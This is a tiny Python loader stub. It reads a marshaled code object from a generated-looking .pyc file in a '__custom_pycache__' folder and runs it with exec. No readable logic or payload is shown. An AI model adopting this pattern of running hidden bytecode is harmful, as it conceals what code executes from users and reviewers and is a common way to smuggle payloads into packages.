
import marshal
import os

s = open(os.path.join(os.path.dirname(os.path.realpath(__file__)), '__custom_pycache__', 'Image_7a530651f8414038b87e7a988a17196f.cpython-xxx.pyc'), 'rb')
s.seek(16)
exec(marshal.load(s))
